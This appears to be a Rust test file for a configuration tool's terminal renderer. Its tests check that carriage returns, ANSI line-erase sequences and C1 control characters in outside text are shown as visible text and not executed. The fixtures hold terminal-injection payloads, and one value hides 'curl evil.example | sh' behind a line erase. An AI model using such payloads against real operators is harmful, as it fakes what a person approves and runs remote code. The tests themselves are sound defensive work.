//! Every renderer slot that carries text cfgd did not author folds it through
//! [`crate::output::cursor_safe`] — proven by what the terminal is LEFT
//! HOLDING, not by what was written to it.
//!
//! The poison is the pair a hostile value actually needs: a bare `\r` returns
//! the cursor to column 0, and `ESC [ 2 K` erases the row it lands on. Executed,
//! they leave the operator reading the attacker's replacement text on the line
//! that was supposed to describe the thing being approved; folded, the row still
//! carries its own description and the `\r` stands as visible `\x0d`.
//!
//! [`Printer::for_test_live_terminal`] is the only capture that can state this.
//! The scrollback constructor draws to a hidden target and the recording
//! constructor keeps every byte ever written — both would hold the description
//! whether or not the escapes were executed, so the assertion would pass
//! vacuously. The emulated screen EXECUTES cursor moves and line clears, so a
//! description still on it is a description nothing erased.
use crate::output::{Printer, Role, Verbosity};

/// `<text>` followed by the two-character return-and-erase, then the text a
/// hostile value would repaint the row with.
fn poisoned(text: &str) -> String {
    format!("{text}\r\u{1b}[2Krepainted")
}

/// The row survived intact: its own words are still on screen, the carriage
/// return stands after them as visible text rather than as a cursor move, and
/// the text the poison meant to repaint with follows it IMMEDIATELY — nothing
/// of the erase sequence in between, in executed or in literal form.
///
/// The three claims are read off ONE row rather than off the whole screen, and
/// in order, because each of the three ways the fold can be wrong has to fail a
/// different one of them: dropped entirely, or reduced to
/// [`crate::escape_control_chars`], leaves the description erased and the row
/// unfindable; reduced to [`crate::output::strip_ansi`], it leaves the `\r`
/// executed and no `\x0d` to split on; and an escape that reached the screen
/// as literal text lands between the split point and `repainted`.
fn assert_row_survived(held: &str, description: &str) {
    let row = held
        .lines()
        .find(|l| l.contains(description))
        .unwrap_or_else(|| {
            panic!("the row describing {description:?} was repainted away; screen holds: {held:?}")
        });
    let (before, after) = row.split_once("\\x0d").unwrap_or_else(|| {
        panic!("the carriage return was executed instead of shown; row: {row:?}")
    });
    assert!(
        before.contains(description),
        "the row's own words no longer stand ahead of the return; row: {row:?}"
    );
    assert!(
        after.trim_start().starts_with("repainted"),
        "an erase sequence reached the screen between the shown return and the \
         text it meant to repaint with; row: {row:?}"
    );
}

#[test]
fn a_status_subject_cannot_repaint_the_line_it_is_written_on() {
    let (printer, screen) = Printer::for_test_live_terminal(24, 120);
    printer.status_simple(Role::Ok, poisoned("server status: ok"));
    printer.flush();
    assert_row_survived(&screen.contents(), "server status: ok");
}

#[test]
fn a_status_qualifier_cannot_repaint_the_line_it_is_written_on() {
    let (printer, screen) = Printer::for_test_live_terminal(24, 120);
    printer
        .status(Role::Warn, "curl")
        .qualifier(poisoned("missing"));
    printer.flush();
    assert_row_survived(&screen.contents(), "missing");
}

#[test]
fn a_status_detail_cannot_repaint_the_line_it_is_written_on() {
    let (printer, screen) = Printer::for_test_live_terminal(24, 120);
    printer
        .status(Role::Fail, "install")
        .detail(poisoned("exit code 1"));
    printer.flush();
    assert_row_survived(&screen.contents(), "exit code 1");
}

#[test]
fn a_kv_key_and_value_cannot_repaint_the_rows_they_are_written_on() {
    let (printer, screen) = Printer::for_test_live_terminal(24, 120);
    printer.kv("Server Status", poisoned("ok"));
    printer.kv(poisoned("Device"), "d-1");
    printer.flush();
    let held = screen.contents();
    assert_row_survived(&held, "Server Status");
    // The KEY's own word, never the value beside it: `d-1` is written after
    // the erase lands, so it stands on the row whether the key was folded or
    // not and would pin only the value fold a second time.
    assert_row_survived(&held, "Device");
}

/// The announce arm this covers fires only when there is NO bar to hold the
/// label — a redirected run — so the emulated screen cannot reach it and the
/// scrollback capture is the right one: what it holds IS the log file the
/// operator opens afterwards, escapes and all.
#[test]
fn an_output_window_label_cannot_repaint_the_log_it_announces_into() {
    let (printer, buf) = Printer::for_test_live_scrollback();
    let window = printer.output_window(poisoned("running hook"));
    window.finish_ok("done");
    printer.flush();
    let held = crate::test_helpers::captured_text(&buf);
    assert_row_survived(&held, "running hook");
}

/// The `\n` exemption, which the fold exists around: a subject really is
/// allowed to be two sentences (a brew caveat is), and the renderer lays the
/// second one out as an indented continuation. Escaping it would print a
/// literal `\x0a` down the middle of the line instead.
#[test]
fn a_multi_line_subject_still_renders_as_an_indented_continuation() {
    let (printer, buf) = Printer::for_test_at(Verbosity::Normal);
    printer.status_simple(Role::Info, "first sentence\nsecond sentence");
    printer.flush();
    let held = crate::test_helpers::captured_text(&buf);
    assert!(
        !held.contains("\\x0a"),
        "the newline was escaped instead of laid out: {held:?}"
    );
    let lines: Vec<&str> = held.lines().collect();
    assert_eq!(lines.len(), 2, "expected two physical lines: {held:?}");
    assert!(lines[0].contains("first sentence"), "got: {:?}", lines[0]);
    assert!(
        lines[1].starts_with("  ") && lines[1].trim() == "second sentence",
        "continuation is not indented: {:?}",
        lines[1]
    );
}

/// `alert` and `deprecation` are the one role that survives `Verbosity::Quiet`,
/// so on a `-o json` run this line can be the only thing on stderr — with no
/// neighbouring output to make a repaint look wrong.
#[test]
fn an_advisory_cannot_repaint_the_line_it_is_written_on() {
    let (printer, screen) = Printer::for_test_live_terminal(24, 120);
    printer.alert(poisoned("source acme is unreachable"));
    printer.flush();
    assert_row_survived(&screen.contents(), "source acme is unreachable");
}

#[test]
fn a_bullet_a_hint_and_a_code_block_cannot_repaint_the_lines_they_are_written_on() {
    let (printer, screen) = Printer::for_test_live_terminal(24, 120);
    {
        let section = printer.section("Review");
        section.bullet(poisoned("run: install.sh"));
        section.hint(poisoned("cfgd module show nvim"));
        section.code_block([poisoned("packages:")]);
    }
    printer.flush();
    let held = screen.contents();
    assert_row_survived(&held, "run: install.sh");
    assert_row_survived(&held, "cfgd module show nvim");
    assert_row_survived(&held, "packages:");
}

/// A note renders only at `Verbose`, so it needs the verbosity-taking
/// constructor rather than the default `Normal` one — at `Normal` the screen
/// is empty and every assertion below would fail on the row lookup rather than
/// pass vacuously.
#[test]
fn a_note_cannot_repaint_the_line_it_is_written_on() {
    let (printer, screen) = Printer::for_test_live_terminal_at(Verbosity::Verbose, 24, 120);
    printer.note(poisoned("the module declares no packages"));
    printer.flush();
    assert_row_survived(&screen.contents(), "the module declares no packages");
}

/// A table pads its columns in terminal columns, so the fold has to happen
/// BEFORE the widths are taken. Both a header and a cell are poisoned, and the
/// row below them still aligns to the column the folded text really occupies —
/// a width measured over the unfolded string would put `aligned` somewhere
/// else.
#[test]
fn a_table_header_and_cell_cannot_repaint_the_rows_they_are_written_on() {
    use crate::output::renderer::Table;
    let (printer, screen) = Printer::for_test_live_terminal(24, 200);
    printer.table(
        Table::new([poisoned("Name"), "Command".to_string()])
            .row([poisoned("nvim"), "aligned".to_string()])
            .row(["zsh".to_string(), "second".to_string()]),
    );
    printer.flush();
    let held = screen.contents();
    assert_row_survived(&held, "Name");
    assert_row_survived(&held, "nvim");
    let column_of = |needle: &str| {
        let row = held
            .lines()
            .find(|l| l.contains(needle))
            .unwrap_or_else(|| panic!("row {needle:?} missing; screen holds: {held:?}"));
        row.find(needle)
            .map(|i| crate::output::measure_width(&row[..i]))
            .unwrap_or_else(|| panic!("needle {needle:?} missing in {row:?}"))
    };
    assert_eq!(
        column_of("aligned"),
        column_of("second"),
        "the second column must be padded against the folded width; screen holds: {held:?}"
    );
}

#[test]
fn a_command_list_description_cannot_repaint_the_line_it_is_written_on() {
    let (printer, screen) = Printer::for_test_live_terminal(24, 120);
    printer.command_list([("cfgd apply", poisoned("converge this machine"))]);
    printer.flush();
    assert_row_survived(&screen.contents(), "converge this machine");
}

#[test]
fn a_heading_and_a_section_name_cannot_repaint_the_lines_they_are_written_on() {
    let (printer, screen) = Printer::for_test_live_terminal(24, 120);
    printer.heading(poisoned("Module nvim"));
    {
        let section = printer.section(poisoned("Files"));
        section.status_simple(Role::Ok, "init.lua");
    }
    printer.flush();
    let held = screen.contents();
    assert_row_survived(&held, "Module nvim");
    assert_row_survived(&held, "Files");
}

/// A child process's own output reaches this slot, and the window in front of
/// it settles a `\r`-rewritten progress line rather than escaping it — so the
/// renderer's fold is what a caller reaching the slot directly gets.
#[test]
fn a_streamed_child_line_cannot_repaint_the_line_it_is_written_on() {
    let (printer, screen) = Printer::for_test_live_terminal(24, 120);
    printer.stream_line_at(0, &poisoned("Fetching neovim"));
    printer.flush();
    assert_row_survived(&screen.contents(), "Fetching neovim");
}

/// A `\r` that opens a CRLF is a line break, not a cursor move: a detail
/// captured on Windows lays out as the same indented continuation a `\n` gets,
/// with no `\x0d` at the end of each line. The lone-`\r` half of the rule is
/// pinned by every test above, which is the same slot with the return standing
/// on its own.
#[test]
fn a_crlf_detail_lays_out_as_a_continuation_rather_than_a_visible_return() {
    let (printer, buf) = Printer::for_test_at(Verbosity::Normal);
    printer
        .status(Role::Fail, "install")
        .detail("exit code 1\r\nsee the log");
    printer.flush();
    let held = crate::test_helpers::captured_text(&buf);
    assert!(
        !held.contains("\\x0d"),
        "the CRLF's return was escaped instead of read as part of the line \
         break: {held:?}"
    );
    let lines: Vec<&str> = held.lines().collect();
    assert_eq!(lines.len(), 2, "expected two physical lines: {held:?}");
    assert!(lines[0].contains("exit code 1"), "got: {:?}", lines[0]);
    assert!(
        lines[1].trim() == "see the log",
        "continuation is not the second line: {:?}",
        lines[1]
    );
}

/// The fold's own contract for the two shapes a carriage return arrives in,
/// stated on the function rather than through a slot: a CRLF is one line
/// break, a lone `\r` is a cursor move and stays visible. Spelled as exact
/// equalities so a fold that collapsed BOTH — restoring the old render at the
/// cost of the guarantee — fails here rather than passing a `contains` check.
#[test]
fn a_crlf_is_a_line_break_while_a_lone_return_stays_visible() {
    use crate::output::cursor_safe;
    assert_eq!(cursor_safe("one\r\ntwo"), "one\ntwo");
    assert_eq!(cursor_safe("one\rtwo"), "one\\x0dtwo");
    assert_eq!(cursor_safe("trailing\r"), "trailing\\x0d");
    // The escape sequence goes first, so a `\r` left holding a `\n` across a
    // consumed `ESC [ K` is still read as the line break it opens.
    assert_eq!(cursor_safe("one\r\u{1b}[K\ntwo"), "one\ntwo");
}

/// The empty-state placeholder is the section's only line when it has one, so
/// a poison in it repaints the section heading directly above it.
#[test]
fn a_section_empty_state_cannot_repaint_the_line_it_is_written_on() {
    let (printer, screen) = Printer::for_test_live_terminal(24, 120);
    {
        let section = printer.section("Modules");
        section.empty_state(poisoned("no modules configured"));
    }
    printer.flush();
    assert_row_survived(&screen.contents(), "no modules configured");
}

/// `Printer::heading`'s re-route branch cannot be entered from a test build —
/// it sits behind a `debug_assert!(false)` that fires first — so the fold on
/// it is pinned at the composition it writes rather than through the printer.
/// Read on the composed string, since the branch's own styling is the only
/// thing standing between it and the sink.
#[test]
fn the_heading_reroute_branch_folds_before_it_paints() {
    use crate::output::{Theme, printer::heading_fallback_line, strip_ansi};
    let line = heading_fallback_line(&Theme::default(), &poisoned("Module nvim"));
    assert_row_survived(&strip_ansi(&line), "Module nvim");
}

/// The command column, not the description beside it: the description is
/// already pinned above, and a key left unfolded erases the row before its
/// own command reaches the screen.
#[test]
fn a_command_list_key_cannot_repaint_the_line_it_is_written_on() {
    let (printer, screen) = Printer::for_test_live_terminal(24, 120);
    printer.command_list([(poisoned("cfgd apply"), "converge this machine")]);
    printer.flush();
    assert_row_survived(&screen.contents(), "cfgd apply");
}

/// The two composers that paint their own slots, so the renderer's fold would
/// eat the coat if it ran afterwards and the fold has to be theirs. An owner
/// token's `kind` and `name` both carry text a remote module document
/// supplied; a title's label and value are the same slot pair one level up.
#[test]
fn the_owner_and_title_composers_fold_their_own_text_slots() {
    use crate::output::{OwnerLabel, TitleLabel};
    let (printer, screen) = Printer::for_test_live_terminal(24, 200);
    // One poisoned slot per render: two on a row would put the second one's
    // description behind the first one's return, and the row-level assertion
    // reads the FIRST return it finds.
    printer.heading_title(&TitleLabel::new(poisoned("Status"), "dev-tools"));
    printer.heading_title(&TitleLabel::new("Profile", poisoned("dev-tools")));
    {
        let _section = printer.section_owner(&OwnerLabel::new(poisoned("module"), "vim-config"));
    }
    {
        let _section = printer.section_owner(&OwnerLabel::new("source", poisoned("acme")));
    }
    printer.flush();
    let held = screen.contents();
    assert_row_survived(&held, "Status");
    assert_row_survived(&held, "Profile");
    assert_row_survived(&held, "module");
    assert_row_survived(&held, "acme");
}

/// The status line's trailing label and its target path — the two slots a
/// status can carry besides subject, qualifier and detail.
#[test]
fn a_status_label_and_target_cannot_repaint_the_line_they_are_written_on() {
    let (printer, screen) = Printer::for_test_live_terminal(24, 200);
    printer
        .status(Role::Ok, "deployed")
        .label(Role::Info, poisoned("source:acme"));
    printer
        .status(Role::Ok, "wrote")
        .target(std::path::Path::new(&poisoned("/etc/hosts")));
    printer.flush();
    let held = screen.contents();
    assert_row_survived(&held, "source:acme");
    assert_row_survived(&held, "/etc/hosts");
}

/// The live region, which is where the same text lands when somebody IS
/// watching: the non-TTY announce arm is pinned above, and this is the arm it
/// degrades from. The emulated screen is the only capture that can tell them
/// apart — it EXECUTES what the bar paints, so a label whose erase ran leaves
/// no row to find.
#[test]
fn a_live_bar_label_cannot_repaint_the_region_it_paints_in() {
    let (printer, screen) = Printer::for_test_live_terminal(24, 200);
    let mut spinner = printer.spinner(poisoned("Cloning acme/config"));
    // The steady tick redraws from another thread and its clear/cursor-move
    // sequences interleave with this thread's draws, which is what left the
    // emulated screen blank in CI.
    spinner.bar.disable_steady_tick();
    spinner.set_message(poisoned("Fetching acme/config"));
    let held = screen.contents();
    let _ = spinner.finish_ok("cloned");
    printer.flush();
    assert_row_survived(&held, "Fetching acme/config");
}

/// The window's label on the arm that HAS a bar. The tail below it is a child
/// process's output and is sanitized on its own way in; the label is the
/// caller's, and a module's own `run:` body reaches it.
#[test]
fn an_output_window_label_cannot_repaint_the_region_it_paints_in() {
    let (printer, screen) = Printer::for_test_live_terminal(24, 200);
    let mut window = printer.output_window(poisoned("postApply: install.sh"));
    window.disable_steady_tick();
    window.push_line("compiling");
    let held = screen.contents();
    let _ = window.finish_ok("done");
    printer.flush();
    assert_row_survived(&held, "postApply: install.sh");
}

/// The one line a live region writes about itself. Its production text is a
/// count cfgd formats, so this pins the slot rather than a reachable payload —
/// the row above it is somebody's action, and an erase here takes that row.
#[test]
fn a_live_region_note_cannot_repaint_the_region_it_paints_in() {
    let (printer, screen) = Printer::for_test_live_terminal(24, 200);
    let row = printer.live_row_first(0);
    row.set_note(&poisoned("3 settled rows held for commit"));
    let held = screen.contents();
    row.retire();
    printer.flush();
    assert_row_survived(&held, "3 settled rows held for commit");
}

/// The pre-approval counterpart of [`assert_row_survived`], for the two RAW
/// renderers: they take the ESCAPE policy, so the hostile bytes are SHOWN
/// rather than deleted. The row carries its own words, then a visible
/// `\x0d`, then the erase sequence spelled out, then the text the poison
/// meant to repaint with — nothing of it executed, and nothing of it gone.
///
/// Showing the erase is the whole point on a screen somebody approves from:
/// the bytes about to be written to disk are the bytes on the line.
fn assert_row_escaped(held: &str, description: &str) {
    let row = held
        .lines()
        .find(|l| l.contains(description))
        .unwrap_or_else(|| {
            panic!("the row describing {description:?} was repainted away; screen holds: {held:?}")
        });
    let (before, after) = row.split_once("\\x0d").unwrap_or_else(|| {
        panic!("the carriage return was executed instead of shown; row: {row:?}")
    });
    assert!(
        before.contains(description),
        "the row's own words no longer stand ahead of the return; row: {row:?}"
    );
    assert_eq!(
        after, "\\x1b[2Krepainted",
        "the erase sequence was stripped instead of shown, so an operator \
         approves bytes the screen never rendered; row: {row:?}"
    );
}

/// `cfgd plan --diff` renders a module's own file — delivered by a remote
/// registry or a git source — on the screen the operator reads before running
/// `cfgd apply`.
///
/// The diff's line splitter treats the lone return as a break of its own, so
/// the poison lands as two rows rather than one: the escape has to hold on
/// both of them, or the erase runs and takes the row that names the change.
#[test]
fn a_diff_row_cannot_repaint_the_screen_it_is_read_from() {
    let (printer, screen) = Printer::for_test_live_terminal(24, 200);
    printer.diff(
        "packages: []\n",
        &format!("{}\n", poisoned("packages: [ripgrep]")),
    );
    printer.flush();
    let held = screen.contents();
    let row = held
        .lines()
        .find(|l| l.contains("packages: [ripgrep]"))
        .unwrap_or_else(|| panic!("the added row was repainted away; screen holds: {held:?}"));
    assert!(
        row.ends_with("\\x0d"),
        "the carriage return was executed instead of shown; row: {row:?}"
    );
    assert!(
        held.lines().any(|l| l == "+\\x1b[2Krepainted"),
        "the erase sequence was stripped instead of shown, so an operator \
         reads a diff that is not the file: {held:?}"
    );
}

/// `cfgd generate` shows a model-authored manifest through this renderer with
/// an Accept/Reject prompt seven lines below it. What the operator reads is
/// what gets written.
#[test]
fn a_syntax_highlighted_body_cannot_repaint_the_screen_it_is_approved_from() {
    let (printer, screen) = Printer::for_test_live_terminal(24, 200);
    printer.syntax_highlight(&poisoned("  packages: [ripgrep]"), "yaml");
    printer.flush();
    assert_row_escaped(&screen.contents(), "packages: [ripgrep]");
}

/// A terminal decoding UTF-8 acts on `U+009B` as CSI, so the C1 range is the
/// same attack without an ESC byte to look for.
#[test]
fn a_c1_control_in_approved_content_is_shown_rather_than_executed() {
    let (printer, screen) = Printer::for_test_live_terminal(24, 200);
    printer.syntax_highlight("  image: alpine\u{9b}2Krepainted", "yaml");
    printer.flush();
    let held = screen.contents();
    let row = held
        .lines()
        .find(|l| l.contains("image: alpine"))
        .unwrap_or_else(|| panic!("the row was repainted away; screen holds: {held:?}"));
    assert!(
        row.trim_end().ends_with("image: alpine\\x9b2Krepainted"),
        "the C1 introducer was executed or stripped instead of shown; row: {row:?}"
    );
}

/// The mechanism that lets a PRE-APPROVAL surface show what the renderer
/// would otherwise strip: a surface whose contract is "these exact bytes"
/// escapes first, and the renderer's fold is then the identity on what it
/// produced. Neither half of the fold has anything left to act on — there is
/// no ESC byte for `strip_ansi` to find and no control character for the
/// escape pass to reach — so the two policies compose instead of fighting.
#[test]
fn an_already_escaped_value_survives_the_renderer_fold_unchanged() {
    use crate::{escape_control_chars, output::cursor_safe};
    for raw in [
        "harmless\r\u{1b}[2Kcurl evil.example | sh",
        "two\nlines",
        "tab\there",
        "windows\r\nline",
        "c1\u{9b}2K",
    ] {
        let escaped = escape_control_chars(raw);
        assert_eq!(
            cursor_safe(&escaped),
            escaped,
            "the renderer fold changed an already-escaped value: {raw:?}"
        );
        assert!(
            !escaped.contains('\u{1b}') && !escaped.contains('\r'),
            "escaping left a live control byte: {escaped:?}"
        );
    }
}
